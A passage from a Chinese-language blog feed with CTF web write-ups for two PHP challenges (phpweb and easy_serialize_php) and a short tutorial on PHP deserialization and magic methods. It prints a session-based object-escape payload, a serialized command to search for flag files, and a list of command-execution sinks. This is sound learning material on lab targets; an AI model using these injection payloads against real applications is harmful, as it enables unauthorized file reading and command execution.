data-src=\"https://i.loli.net/2021/07/04/CANDRsYMy3PUqQc.png\" alt>&lt;!--p3--&gt;</p>\n<p>打入 payload，在注释中得到 flag，如图：</p>\n<p><img data-src=\"https://i.loli.net/2021/07/04/sVug5h7UnfCzjSG.png\" alt>&lt;!--p4--&gt;</p>\n<h1 id=\"3网鼎杯-2020-朱雀组phpweb\"><a class=\"anchor\" href=\"#3网鼎杯-2020-朱雀组phpweb\">#</a> 3.[网鼎杯 2020 朱雀组] phpweb</h1>\n<p>进去页面后发现五秒刷新一次，还会出现警告 warning，如图：</p>\n<p><img data-src=\"https://i.loli.net/2021/07/06/vREfAQ4MzBOsNuZ.png\" alt=\"3.1.png\">&lt;!--p1--&gt;</p>\n<p>用 bp 抓一下包，发现一直在传送两条数据</p>\n<p><img data-src=\"https://i.loli.net/2021/07/06/4SKAOMwm1QfLWnr.png\" alt>&lt;!--p2--&gt;</p>\n<p>百度了一下，发现可能有函数执行的操作</p>\n<p><img data-src=\"https://i.loli.net/2021/07/06/QmlZz9xS1tF72JR.png\" alt>&lt;!--p3--&gt;</p>\n<p>根据函数 file_get_contents 读取信息，于是得到 index.php：</p>\n<p><img data-src=\"https://i.loli.net/2021/07/06/LcBgh6D1aXkdREb.png\" alt>&lt;!--p4--&gt;</p>\n<p>考虑通过 system、passthur 或者 exec 执行命令读取信息，但是可以发现第 24 行已经将它们在 func 中屏蔽掉。</p>\n<p><img data-src=\"https://i.loli.net/2021/07/06/IZp5PFnGTN6kziW.png\" alt>&lt;!--p5--&gt;</p>\n<p>就是说其不能作为函数，但是我们可以用反序列化 unserialize () 绕过</p>\n<p>先序列化构造 payload</p>\n<p><img data-src=\"https://i.loli.net/2021/07/06/jT8fVUkthDFI3RY.png\" alt>&lt;!--p6--&gt;</p>\n<p>然后再通过 bp 传一次参</p>\n<p><img data-src=\"https://i.loli.net/2021/07/06/7uZMj9wfdoaTk4r.png\" alt>&lt;!--p7--&gt;</p>\n<p>由于找不到有用的信息，于是百度后，我 get 到了新方法！！</p>\n<p><strong>find 用法：</strong><br>\n<strong>find path -option [ -print ] [ -exec -ok command ] {} ;</strong><br>\n<strong>path： . 代表当前路径，/ 代表总目录</strong><br>\n<strong> - name name, -iname name : 文件名称符合 name 的文件。iname 会忽略大小写</strong><br>\n<strong> name 可以使用通配符，如 “flag.*”</strong></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucnVub29iLmNvbS9saW51eC9saW51eC1jb21tLWZpbmQuaHRtbA==\">菜鸟教程 find 用法</span></p>\n<p>所以可以构造 find /-iname&quot;flag.*&quot;, 然后序列化得到字符串：</p>\n<p><img data-src=\"https://i.loli.net/2021/07/06/DV54UAlcZgivWMu.png\" alt>&lt;!--p8--&gt;</p>\n<p>然后继续用 bp 传参，找到 flag 文件，通过 readfile 或 file_get_contents 读取 flag</p>\n<p><img data-src=\"https://i.loli.net/2021/07/06/a2fITqS4G5ktVNE.png\" alt>&lt;!--p9--&gt;</p>\n<p><img data-src=\"https://i.loli.net/2021/07/06/vX1QCnoheuZRB4b.png\" alt>&lt;!--p10--&gt;</p>\n<hr>\n<h1 id=\"4安洵杯-2019easy_serialize_php\"><a class=\"anchor\" href=\"#4安洵杯-2019easy_serialize_php\">#</a> 4.[安洵杯 2019] easy_serialize_php</h1>\n<p>进入网站就能看到原码，先复制到本地</p>\n<p><img data-src=\"https://i.loli.net/2021/07/06/HoBFiM4TEJUfYtj.png\" alt>&lt;!--p1--&gt;</p>\n<p>先审计代码，在 31 行找到序列化函数，在 38 行找到但反列化函数，且参数可控通过 get 传参</p>\n<p>所以，根据提示先让 $function = phpinfo，通过 bp 传参（或是直接在浏览器输入）</p>\n<p>我先用的 bp，出现代码后复制到本地，查找 flag、ag、fl、f1ag 等等相关名词，成功找到文件</p>\n<p><img data-src=\"https://i.loli.net/2021/07/06/ct24bNzhofQ9BvD.png\" alt=\"4.2.png\">&lt;!--p2--&gt;</p>\n<p>后来又试了一下网址直接传，大概浏览了一遍也能找到。</p>\n<p><img data-src=\"https://i.loli.net/2021/07/06/HnglVwDsRmkUfZy.png\" alt=\"4.3.png\">&lt;!--p3--&gt;</p>\n<p>知道了文件名，无法直接读，所以准备用代码中的 file_get_contents () 函数读取</p>\n<p>所以需要让 base64_decode ($userinfo [‘img’]) = d0g3_f1ag.php ，根据百度进行 base64 加密，</p>\n<p>就需要让 $userinfo [‘img’] = ZDBnM19mMWFnLnBocA==</p>\n<p>又因为<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>u</mi><mi>s</mi><mi>e</mi><mi>r</mi><mi>i</mi><mi>n</mi><mi>f</mi><mi>o</mi><mo stretchy=\"false\">[</mo><mtext>‘</mtext><mi>i</mi><mi>m</mi><mi>g</mi><mtext>’</mtext><mo stretchy=\"false\">]</mo><mtext>是由</mtext></mrow><annotation encoding=\"application/x-tex\">userinfo[‘img’]是由</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">u</span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\">n</span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mord mathnormal\">o</span><span class=\"mopen\">[</span><span class=\"mord\">‘</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\">m</span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">g</span><span class=\"mord\">’</span><span class=\"mclose\">]</span><span class=\"mord cjk_fallback\">是</span><span class=\"mord cjk_fallback\">由</span></span></span></span> serialize_info 反序列化得到的</p>\n<p><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>s</mi><mi>e</mi><mi>r</mi><mi>i</mi><mi>a</mi><mi>l</mi><mi>i</mi><mi>z</mi><msub><mi>e</mi><mi>i</mi></msub><mi>n</mi><mi>f</mi><mi>o</mi><mtext>又是由</mtext></mrow><annotation encoding=\"application/x-tex\">serialize_info又是由</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\" style=\"margin-right:0.04398em;\">z</span><span class=\"mord\"><span class=\"mord mathnormal\">e</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.31166399999999994em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord mathnormal\">n</span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mord mathnormal\">o</span><span class=\"mord cjk_fallback\">又</span><span class=\"mord cjk_fallback\">是</span><span class=\"mord cjk_fallback\">由</span></span></span></span>_SESSION 序列化然后过滤得到的</p>\n<p><img data-src=\"https://i.loli.net/2021/07/06/H85V3LjgGR26Fmh.png\" alt>&lt;!--p7--&gt;</p>\n<p>但是如果对 $_SESSION ['img'] 赋值，则会被 sha1 进行再次加密，且不可逆，无法得到答案</p>\n<p>所以只能从过滤函数过滤序列化字符串处开始下手</p>\n<p>此处参考了 https://blog.csdn.net/qq_43622442/article/details/106003691</p>\n<p>当中对对象逃逸问题有详细的说明：（我还在参悟这东西，实在头大）</p>\n<p><img data-src=\"https://i.loli.net/2021/07/06/qbxrYCc8yPMOw1d.png\" alt>&lt;!--p4--&gt;</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token constant\">_SESSION</span><span class=\"token punctuation\">[</span>user<span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>flagflagflagflagflagflag<span class=\"token operator\">&amp;</span><span class=\"token constant\">_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token keyword\">function</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>a<span class=\"token string double-quoted-string\">\";s:8:\"</span><span class=\"token keyword\">function</span><span class=\"token string double-quoted-string\">\";s:7:\"</span>xxx<span class=\"token string double-quoted-string\">\";s:3:\"</span>img<span class=\"token string double-quoted-string\">\";s:20:\"</span>ZDBnM19mMWFnLnBocA<span class=\"token operator\">==</span>\"<span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>然后输入后查看源码有注释：</p>\n<p><img data-src=\"https://i.loli.net/2021/07/06/2O9ufc8rFMBsQyi.png\" alt>&lt;!--p5--&gt;</p>\n<p>把 img 文件名加密后一换，长度没变，就能得到 flag</p>\n<p><img data-src=\"https://i.loli.net/2021/07/06/TfvPdlA9KWGshat.png\" alt>&lt;!--p6--&gt;</p>\n<hr>\n<p>END</p>\n",
            "tags": [
                "反序列化"
            ]
        },
        {
            "id": "http://imfanqie.top/2021/07/04/ctf/web/pop/ctfweb-PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/",
            "url": "http://imfanqie.top/2021/07/04/ctf/web/pop/ctfweb-PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/",
            "title": "ctfweb-PHP反序列化",
            "date_published": "2021-07-04T10:33:13.829Z",
            "content_html": "<p>学习了一下 php 反序列化漏洞，并做了一些整理。</p>\n<p><span id=\"more\"></span></p>\n<h1 id=\"简单理解\"><a class=\"anchor\" href=\"#简单理解\">#</a> 简单理解</h1>\n<p>serialize 将一个对象转换成一个字符串<br>\n unserialize 将一个字符串还原成一个对象</p>\n<hr>\n<p><em><strong>序列化：</strong></em></p>\n<p><img data-src=\"https://i.loli.net/2021/07/04/j8PEukm6tS3hxL1.png\" alt>&lt;!--p1--&gt;</p>\n<p>如图所示:</p>\n<p><code>O:6:&quot;People&quot;:2:&#123;s:4:&quot;name&quot;;s:4:&quot;jack&quot;;s:3:&quot;age&quot;;i:18;&#125;</code></p>\n<p>就是我们输入的 people 信息经过序列化得到的字符串，其中</p>\n<p><img data-src=\"https://i.loli.net/2021/07/04/OjPnzYag1oLSsQW.png\" alt></p>\n<p>需要注意的是：</p>\n<p><strong>\\x00 + 类名 + \\x00 + 变量名 反序列化出来的是 private 变量</strong></p>\n<p><strong>\\x00 + * + \\x00 + 变量名 反序列化出来的是 protected 变量</strong></p>\n<hr>\n<p><em><strong>反序列化</strong></em></p>\n<p>我们通过 post 传递这串序列化的字符串，来验证使用 unserialize</p>\n<p><img data-src=\"https://i.loli.net/2021/07/04/oUKcSPMQtkHR3IF.png\" alt></p>\n<p>两者配合引起了问题所在。</p>\n<hr>\n<h1 id=\"魔术方法\"><a class=\"anchor\" href=\"#魔术方法\">#</a> 魔术方法</h1>\n<p>__wakeup () // 使用 unserialize 时触发<br>\n__sleep () // 使用 serialize 时触发</p>\n<p>__destruct () // 对象被销毁时触发</p>\n<p>__call () // 在对象上下文中调用不可访问的方法时触发<br>\n__callStatic () // 在静态上下文中调用不可访问的方法时触发</p>\n<p>__get () // 用于从不可访问的属性读取数据<br>\n__set () // 用于将数据写入不可访问的属性</p>\n<p>__isset () // 在不可访问的属性上调用 isset () 或 empty () 触发<br>\n__unset () // 在不可访问的属性上使用 unset () 时触发</p>\n<p>__toString () // 把类当作字符串使用时触发<br>\n__invoke () // 当脚本尝试将对象调用为函数时触发</p>\n<p><em><strong>最常用的：</strong></em></p>\n<pre><code>__construct，构造函数，PHP 5 允行开发者在一个类中定义一个方法作为构造函数。具有构造函数的类会在每次创建新对象时先调用此方法，所以非常适合在使用对象之前做一些初 始化工作。 \n__toString，打印一个对象时，如果定义了__toString()方法，就能在测试时，通过echo 打印对象体，对象就会自动调用它所属类定义的toString方法，格式化输出这个对象所包含 的数据。\n__destruct，析构函数，PHP 5 引入了析构函数的概念，这类似于其它面向对象的语言， 如 C++。析构函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行。 \n__sleep magic方法在一个对象被序列化的时候调用。 \n__wakeup magic方法在一个对象被反序列化的时候调用。\n</code></pre>\n<p><img data-src=\"https://i.loli.net/2021/07/04/aH1BTjV4I3kn8Ld.png\" alt>&lt;!--p4--&gt;</p>\n<p><img data-src=\"https://i.loli.net/2021/07/04/Ir6gTMOGWeV5xkA.png\" alt>&lt;!--p5--&gt;</p>\n<hr>\n<h1 id=\"php反序列化漏洞\"><a class=\"anchor\" href=\"#php反序列化漏洞\">#</a> php 反序列化漏洞</h1>\n<p>PHP 反序列化漏洞又叫 PHP 对象注入漏洞，反序列化的数据本质上来说是没有危害的，但是在 反序列化参数可控时，可能会产生严重的安全威胁。当传给  unserialize () 的参数可控时， 我们可以通过传入一个精心构造的序列化字符串，从而控制对象内部的变量甚至是函数。</p>\n<p>攻击流程就是在本地写一个序列化的文件，拿得到的字符串去打远程</p>\n<p>重点关注的函数：<br>\n代码执行：eval ()      assert ()<br>\n 命令执行：exec ()      passthru ()      system ()      popen ()<br>\n<strong> 文件操作</strong>：file_put_contents ()      file_get_contents ()      unlink ()</p>\n<p>常用：</p>\n<p>exec — 执行一个外部程序（exec (whoami)）</p>\n<p>passthru — 执行外部程序并且显示原始输出，同上</p>\n<p>system — 执行外部程序，并且显示输出（system (whoami)、system (ls)）</p>\n<p>file_get_contents — 将整个文件读入一个字符串（file_get_contents (flag.php)）</p>\n<p>unlink — 删除文件</p>\n<hr>\n<p><strong>下一篇做题练手</strong></p>\n<hr>\n<p>END</p>\n",
            "tags": [
                "反序列化"
            ]
        }
    ]
}